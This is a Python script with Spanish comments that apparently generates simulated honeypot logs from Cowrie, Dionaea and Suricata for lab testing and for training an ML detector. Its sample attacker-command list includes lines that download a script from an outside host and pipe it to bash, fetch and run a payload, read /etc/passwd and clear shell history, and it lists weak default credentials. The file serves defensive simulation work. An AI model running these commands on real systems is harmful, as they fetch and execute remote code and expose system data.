"""
============================================================
scripts/data_simulator.py
------------------------------------------------------------
SIMULADOR DE DATOS DE HONEYPOT
------------------------------------------------------------
¿Para qué sirve?
  Genera eventos falsos realistas de Cowrie, Dionaea y
  Suricata para poder probar el sistema sin tráfico real.
  Útil en entornos de laboratorio o para entrenar el modelo
  de ML antes de desplegarlo.
============================================================
"""

import json
import random
import time
import os
from datetime import datetime, timedelta


# ── Datos de muestra ────────────────────────────────────────

# IPs que simularán atacantes (algunas repetidas = más realismo)
ATTACKER_IPS = [
    "192.168.1.100", "10.0.0.55", "172.16.0.200",
    "45.33.32.156", "198.20.69.74", "185.220.101.5",
    "89.248.167.131", "91.238.181.34", "185.156.73.55",
    "103.216.220.11", "194.165.16.72", "45.155.205.225",
]

# Credenciales débiles que usarían atacantes reales
WEAK_CREDENTIALS = [
    ("root", "root"), ("admin", "admin"), ("root", "123456"),
    ("admin", "password"), ("user", "user"), ("pi", "raspberry"),
    ("root", "toor"), ("test", "test"), ("guest", "guest"),
    ("ubuntu", "ubuntu"), ("root", ""), ("admin", "1234"),
]

# Comandos SSH que un atacante ejecutaría tras entrar
ATTACKER_COMMANDS = [
    "cat /etc/passwd",
    "uname -a",
    "whoami",
    "ls -la /",
    "ps aux",
    "wget http://malicious.site/payload.sh",
    "curl http://185.220.101.5/bot.sh | bash",
    "chmod +x payload.sh && ./payload.sh",
    "crontab -e",
    "cat /proc/cpuinfo",
    "free -m",
    "df -h",
    "netstat -antp",
    "iptables -L",
    "history -c",
]

# Puertos que un escáner de puertos visitaría
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
              443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 8080]

# Tipos de malware para Dionaea
MALWARE_TYPES = [
    "Trojan.Agent", "Backdoor.IRC", "Worm.Conficker",
    "Exploit.SMB", "Ransomware.WannaCry", "Botnet.Mirai",
]

# Protocolos capturados por Dionaea
DIONAEA_PROTOCOLS = ["smb", "ftp", "http", "mssql", "mysql", "sip"]


# ── Generadores de eventos ───────────────────────────────────

def generate_cowrie_event(event_type: str = None) -> dict:
    """
    Genera un evento JSON similar a los logs reales de Cowrie.
    Cowrie es el honeypot SSH/Telnet. Registra:
      - Intentos de login (credenciales probadas)
      - Comandos ejecutados por atacantes
      - Conexiones y desconexiones
    """
    ip = random.choice(ATTACKER_IPS)
    now = datetime.utcnow()

    # Si no se especifica tipo, elegir aleatoriamente
    if event_type is None:
        event_type = random.choice([
            "cowrie.login.failed",
            "cowrie.login.success",
            "cowrie.command.input",
            "cowrie.session.connect",
        ])

    user, password = random.choice(WEAK_CREDENTIALS)

    event = {
        "timestamp":   now.isoformat() + "Z",
        "source":      "cowrie",
        "eventid":     event_type,
        "src_ip":      ip,
        "src_port":    random.randint(1024, 65535),
        "dst_port":    22,                          # Puerto SSH
        "protocol":    "ssh",
        "username":    user,
        "password":    password,
        "session":     f"sess_{random.randint(10000,99999)}",
        "sensor":      "honeypot-rpi",
    }

    # Agregar comando si es ese tipo de evento
    if event_type == "cowrie.command.input":
        event["input"] = random.choice(ATTACKER_COMMANDS)

    return event


def generate_dionaea_event() -> dict:
    """
    Genera un evento JSON similar a los logs de Dionaea.
    Dionaea es el honeypot que captura malware. Simula
    servicios vulnerables (SMB, FTP, HTTP) para atraer
    exploits y registrar el malware descargado.
    """
    ip = random.choice(ATTACKER_IPS)
    now = datetime.utcnow()
    protocol = random.choice(DIONAEA_PROTOCOLS)

    event = {
        "timestamp":  now.isoformat() + "Z",
        "source":     "dionaea",
        "eventid":    random.choice([
            "dionaea.connection.tcp",
            "dionaea.download.complete",
            "dionaea.exploit.attempt",
        ]),
        "src_ip":     ip,
        "src_port":   random.randint(1024, 65535),
        "dst_port":   {"smb": 445, "ftp": 21, "http": 80,
                       "mssql": 1433, "mysql": 3306, "sip": 5060}[protocol],
        "protocol":   protocol,
        "malware":    random.choice(MALWARE_TYPES) if random.random() > 0.6 else None,
        "payload_size": random.randint(100, 50000),
        "sensor":     "honeypot-rpi",
    }

    return event


def generate_suricata_event() -> dict:
    """
    Genera un evento similar al log fast.log de Suricata IDS.
    Suricata analiza el tráfico en tiempo real y genera alertas
    cuando detecta patrones conocidos de ataques.
    Formato: timestamp [**] [sid:msg] [Classification: X] {proto} src -> dst
    """
    ip = random.choice(ATTACKER_IPS)
    now = datetime.utcnow()

    rules = [
        ("ET SCAN Nmap Scripting Engine", "port_scan",   "Attempted Information Leak"),
        ("ET BRUTE SSH Brute Force",      "brute_force", "Attempted Administrator Privilege Gain"),
        ("ET MALWARE Mirai Botnet",       "malware",     "A Network Trojan was Detected"),
        ("ET EXPLOIT SMBv1 EternalBlue",  "exploit",     "Attempted User Privilege Gain"),
        ("ET DOS HTTP Flood",             "dos",         "Denial of Service Attack"),
        ("ET INFO Tor Exit Node",         "anonymizer",  "Potential Corporate Privacy Violation"),
    ]

    rule_msg, attack_type, classification = random.choice(rules)
    dst_port = random.choice(SCAN_PORTS)
    proto = random.choice(["TCP", "UDP", "ICMP"])

    # Formato del log de Suricata (fast.log)
    log_line = (
        f"{now.strftime('%m/%d/%Y-%H:%M:%S.%f')[:-3]} "
        f"[**] [1:200{random.randint(1000,9999)}:2] {rule_msg} [**] "
        f"[Classification: {classification}] [Priority: {random.randint(1,3)}] "
        f"{{{proto}}} {ip}:{random.randint(1024,65535)} -> 10.0.0.1:{dst_port}"
    )

    return {
        "raw":          log_line,
        "timestamp":    now.isoformat() + "Z",
        "source":       "suricata",
        "src_ip":       ip,
        "dst_port":     dst_port,
        "protocol":     proto.lower(),
        "rule_msg":     rule_msg,
        "attack_type":  attack_type,
        "priority":     random.randint(1, 3),
        "sensor":       "honeypot-rpi",
    }


def simulate_brute_force_campaign(target_ip: str = "10.0.0.1",
                                  attacker_ip: str = None,
                                  attempts: int = 30) -> list:
    """
    Simula una campaña real de fuerza bruta:
    Misma IP atacante, muchos intentos en poco tiempo.
    Esto es lo que un atacante real haría con Hydra o Medusa.
    """
    if attacker_ip is None:
        attacker_ip = random.choice(ATTACKER_IPS)

    events = []
    base_time = datetime.utcnow()

    for i in range(attempts):
        user, pwd = WEAK_CREDENTIALS[i % len(WEAK_CREDENTIALS)]
        # Incrementar tiempo gradualmente (simula intentos secuenciales)
        event_time = base_time + timedelta(seconds=i * 0.5)

        event = {
            "timestamp": event_time.isoformat() + "Z",
            "source":    "cowrie",
            "eventid":   "cowrie.login.failed",
            "src_ip":    attacker_ip,
            "src_port":  random.randint(1024, 65535),
            "dst_port":  22,
            "protocol":  "ssh",
            "username":  user,
            "password":  pwd,
            "session":   f"sess_bf_{random.randint(10000,99999)}",
            "sensor":    "honeypot-rpi",
        }
        events.append(event)

    return events


def simulate_port_scan(scanner_ip: str = None) -> list:
    """
    Simula un escaneo de puertos (Nmap o similar).
    Un atacante primero escanea para saber qué servicios
    están abiertos antes de intentar explotar algo.
    """
    if scanner_ip is None:
        scanner_ip = random.choice(ATTACKER_IPS)

    events = []
    base_time = datetime.utcnow()

    for i, port in enumerate(SCAN_PORTS):
        event_time = base_time + timedelta(milliseconds=i * 100)
        events.append({
            "timestamp":  event_time.isoformat() + "Z",
            "source":     "suricata",
            "src_ip":     scanner_ip,
            "dst_port":   port,
            "protocol":   "tcp",
            "rule_msg":   "ET SCAN Nmap Scripting Engine",
            "attack_type": "port_scan",
            "priority":   2,
            "sensor":     "honeypot-rpi",
        })

    return events


def write_simulated_logs(cowrie_path: str, dionaea_path: str,
                         suricata_path: str, n_events: int = 200):
    """
    Escribe los eventos simulados en los archivos de log.
    Combina eventos aleatorios con campañas específicas
    para que el ML tenga datos de calidad.
    """
    print(f"[SIMULATOR] Generando {n_events} eventos simulados...")

    # Crear directorios si no existen
    for path in [cowrie_path, dionaea_path, suricata_path]:
        os.makedirs(os.path.dirname(path), exist_ok=True)

    cowrie_events  = []
    dionaea_events = []
    suricata_lines = []

    # 40% eventos aleatorios normales
    for _ in range(int(n_events * 0.4)):
        cowrie_events.append(generate_cowrie_event())
        dionaea_events.append(generate_dionaea_event())
        suricata_lines.append(generate_suricata_event()["raw"])

    # 30% campaña de fuerza bruta (patrón claro para el ML)
    bf_events = simulate_brute_force_campaign(attempts=int(n_events * 0.3))
    cowrie_events.extend(bf_events)

    # 30% escaneo de puertos
    scan_events = simulate_port_scan()
    suricata_lines.extend([generate_suricata_event()["raw"] for _ in scan_events])

    # ── Escribir logs de Cowrie (formato JSON lines) ─────────
    with open(cowrie_path, "w") as f:
        for ev in cowrie_events:
            f.write(json.dumps(ev) + "\n")

    # ── Escribir logs de Dionaea ─────────────────────────────
    with open(dionaea_path, "w") as f:
        for ev in dionaea_events:
            f.write(json.dumps(ev) + "\n")

    # ── Escribir logs de Suricata (texto plano) ──────────────
    with open(suricata_path, "w") as f:
        for line in suricata_lines:
            f.write(line + "\n")

    print(f"[SIMULATOR] ✓ Cowrie:   {len(cowrie_events)} eventos → {cowrie_path}")
    print(f"[SIMULATOR] ✓ Dionaea:  {len(dionaea_events)} eventos → {dionaea_path}")
    print(f"[SIMULATOR] ✓ Suricata: {len(suricata_lines)} líneas  → {suricata_path}")


# ── Punto de entrada ─────────────────────────────────────────
if __name__ == "__main__":
    write_simulated_logs(
        cowrie_path   = "logs/cowrie/cowrie.json",
        dionaea_path  = "logs/dionaea/dionaea.json",
        suricata_path = "logs/suricata/fast.log",
        n_events      = 300,
    )
    print("[SIMULATOR] Simulación completada.")
